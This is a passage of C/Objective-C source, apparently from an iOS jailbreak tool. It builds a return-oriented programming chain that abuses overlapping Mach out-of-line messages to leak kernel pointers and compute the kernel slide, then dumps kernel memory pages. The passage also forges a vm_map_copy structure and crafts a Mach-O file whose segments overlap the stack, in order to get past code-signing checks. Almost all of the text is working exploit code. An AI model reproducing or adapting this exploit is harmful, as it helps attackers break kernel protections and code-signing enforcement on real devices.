    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
    
    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
    RopAddR0(PUSH, 1024 - 0x58);
    DerefR0(PUSH);
    StoreR0(PUSH, SEG_VAR(vptr));
    
    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
    RopAddR0(PUSH, 1024 - 0x58 + 4);
    DerefR0(PUSH);
    StoreR0(PUSH, SEG_VAR(vptr)+4);
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(vptr)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(vptr),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceClose), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(zero), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
    argss->waitTime.tv_sec = 1;
    argss->waitTime.tv_nsec = 1000000;
    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(svc), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    SendMsg(PUSH, overlapped_port, oolmsg_template_512);
    
    ReadWriteOverlap();
    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
    tmptoscratch();
    LoadIntoR0(PUSH, SEG_VAR(vptr));
    StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
    LoadIntoR0(PUSH, SEG_VAR(vptr)+4);
    StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
    WriteWhatWhere(PUSH, 4096, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
    ReadWriteScratchOverlap();
    
    ReadWriteOverlapped512();
    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
    
    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
    RopAddR0(PUSH, 0x18);
    DerefR0(PUSH);
    RopAddR0(PUSH, -0x02002000);
    StoreR0(PUSH, SEG_VAR(kern_slide));
    
    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
    RopAddR0(PUSH, 0x18 + 4);
    DerefR0(PUSH);
    RopAddR0(PUSH, -0xffffff80);
    StoreR0(PUSH, SEG_VAR(kern_slide)+4);
    
    LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 2);
    Shift2R0(PUSH);
    Shift2R0(PUSH);
    RopAddR0(PUSH, -0x3);
    StoreR0(PUSH, SEG_VAR(tmp1));
    
    WriteWhatWhere(PUSH, 0, SEG_VAR(kern_slide));
    
    LoadIntoR0(PUSH, SEG_VAR(tmp1));
    StoreR0(PUSH, SEG_VAR(kern_slide)+2);
    
    LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 1);
    Shift2R0(PUSH);
    Shift2R0(PUSH);
    StoreR0(PUSH, SEG_VAR(tmp1));
    
    WriteWhatWhere(PUSH, 0, SEG_VAR(kern_slide));
    
    LoadIntoR0(PUSH, SEG_VAR(tmp1));
    StoreR0(PUSH, SEG_VAR(kern_slide) + 2);
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_slide)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_slide),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
    
    LoadIntoR0(PUSH, SEG_VAR(kern_slide));
    RopAddR0(PUSH, 0x02002000);
    StoreR0(PUSH, SEG_VAR(kern_text_base));
    
    LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 4);
    RopAddR0(PUSH, 0xffffff80);
    StoreR0(PUSH, SEG_VAR(kern_text_base)+4);
    
    [dy setSlide:dy.slide+1]; // enter thumb
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
    [dy setSlide:dy.slide-1]; // exit thumb
    
#define dump_step 0
    for (int i = dump_step*0x60; i < (1+dump_step)*0x60; i++) {
        ReadWriteOverlap();
        tmptoscratch();
        LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
        RopAddR0(PUSH, i*0x1000);
        StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
        LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
        StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
        WriteWhatWhere(PUSH, 4096, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
        ReadWriteScratchOverlap();
        
        ReadWriteOverlapped512();
        RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd3), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
    }
    
    
    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
    
    ReadWriteOverlap();
    tmptoscratch();
    WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[1024 - 0x58 + 0x20])); // make sure this does not get free'd
    ReadWriteScratchOverlap();

    RecvMsg(PUSH, 300, tmp_msg);
    RecvMsg(PUSH, 300, tmp_msg);
    RecvMsg(PUSH, 300, tmp_msg);
    RecvMsg(PUSH, 300, tmp_msg);
    RecvMsg(PUSH, 300, tmp_msg);
    RecvMsg(PUSH, 300, tmp_msg);
    

    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
    
    memset(&argss->structData[0], 0, 1024);
    memset(&argss->structData[1024], 0x00, 1024);
    
    for (int i = 0; i < 125; i++) {
        *(uint32_t *)&argss->structData[4 + (i*8)] = 1;
    }
    *(uint32_t *)&argss->structData[4+(120*8)] = 0xFFFFFFFF;  // indicate end
    
    struct vm_map_copy* vm_map_copy = (struct vm_map_copy *)&(argss->structData[1024]);
    
    vm_map_copy->type = 3; // type
    vm_map_copy->sz = 0; // size
    vm_map_copy->ptr = 0xFFFFFF8041414141;
    vm_map_copy->kfree_size = 1024;
    memcpy(&argss->oolbuf[1024-0x58], vm_map_copy, 0x58);
    vm_map_copy->kfree_size = 2048;
    
    strcpy((char *)(vm_map_copy + 1), "qwertyoruiopzqwertyoruiopz");
    
    
    fsz += load_cmd_seg.filesize;
    
    load_cmd_seg.vmaddr = 0x52000000;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = round_page(sizeof(args_t)) + 0x1000;
    load_cmd_seg.vmsize = round_page(sizeof(args_t)) + 0x1000;
    strcpy(&load_cmd_seg.segname[0], "__ROPDATA");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    memcpy(buf + fsz, argss, sizeof(args_t));
    fsz += load_cmd_seg.filesize;
    
    load_cmd_seg.vmaddr = 0x54000000;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = 0;
    load_cmd_seg.vmsize = 0x600000;
    strcpy(&load_cmd_seg.segname[0], "__KERNDUMP");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    memcpy(buf + fsz, argss, sizeof(args_t));
    fsz += load_cmd_seg.filesize;
    
    /* segment overlap over the stack */
    
    load_cmd_seg.vmaddr = 0x110000; // overlap with stack
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = 0x100000;
    load_cmd_seg.vmsize = 0x100000;
    strcpy(&load_cmd_seg.segname[0], "__PAGEZERO"); // must be __PAGEZERO
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    stack = (uint32*)(buf + fsz);
    
    for (int n = 0; n < 0x100; n++) {
        for (int i = 0; i < 0x1000/4;) {
            
            stack[(n*0x1000/4) + (i++)] = pop_r7pc; // POP {R7,PC}
            stack[(n*0x1000/4) + (i++)] = pop_r4r7pc; // POP {R4,R7,PC}
        }
        int c = 0x3F0;
        stack[(n*0x1000/4) + (c++)] = pop_r4r7pc; // PC
        stack[(n*0x1000/4) + (c++)] = ( (n) << 12 ); // R4
        stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
        stack[(n*0x1000/4) + (c++)] = mov_r0_r4_pop_r4r7pc; // PC
        stack[(n*0x1000/4) + (c++)] = 0x52000000 - 8; // R4
        stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
        stack[(n*0x1000/4) + (c++)] = str_r0_r4_8_pop_r4r7pc; // PC
        stack[(n*0x1000/4) + (c++)] = 0x51004000; // R4
        stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
        stack[(n*0x1000/4) + (c++)] = mov_sp_r4_pop_r4r7pc; // PC
        
    }
    fsz += load_cmd_seg.filesize;
    
    load_cmd_seg.fileoff = 0;
    load_cmd_seg.filesize = (uint32_t)0x1000;
    load_cmd_seg.vmsize = (uint32_t)0x1000;
    load_cmd_seg.vmaddr = 0x4FF00000;
    load_cmd_seg.initprot = PROT_READ|PROT_EXEC; // must be EXEC to pass sniffLoadCommands
    load_cmd_seg.maxprot = PROT_READ|PROT_EXEC; // must be EXEC to pass sniffLoadCommands
    load_cmd_seg.cmd = LC_SEGMENT;
    load_cmd_seg.cmdsize = sizeof(load_cmd_seg);
    load_cmd_seg.flags = 0;
    load_cmd_seg.nsects = 0;
    strcpy(&load_cmd_seg.segname[0], "__LC_TEXT");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    fsz += load_cmd_seg.filesize;
    
    
    load_cmd_seg.initprot = PROT_READ;
    load_cmd_seg.maxprot = PROT_READ;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.vmsize = 0x1000;
    load_cmd_seg.vmaddr = 0x50000000+g_data_vmsize+g_text_size+g_lnk_size+0x1000;
    load_cmd_seg.filesize = 0x1000;
    strcpy(&load_cmd_seg.segname[0], "__LINKEDIT");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    fsz += load_cmd_seg.filesize;
    
    
    struct linkedit_data_command cs_cmd;
    
    cs_cmd.cmd = LC_CODE_SIGNATURE;
    cs_cmd.cmdsize = 16;
    cs_cmd.dataoff = fsz;
    cs_cmd.datasize = g_cs_size;
    
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &cs_cmd, cs_cmd.cmdsize);
    mh.sizeofcmds += cs_cmd.cmdsize;
    mh.ncmds++;
    
    
    char *cs_data = (char*)(buf + fsz);
    memcpy(cs_data, g_cs_ptr, g_cs_size);
    fsz += cs_cmd.datasize;
    
    memcpy(buf, &mh, sizeof(mh));
    ftruncate(fd,fsz);
    return 0;
}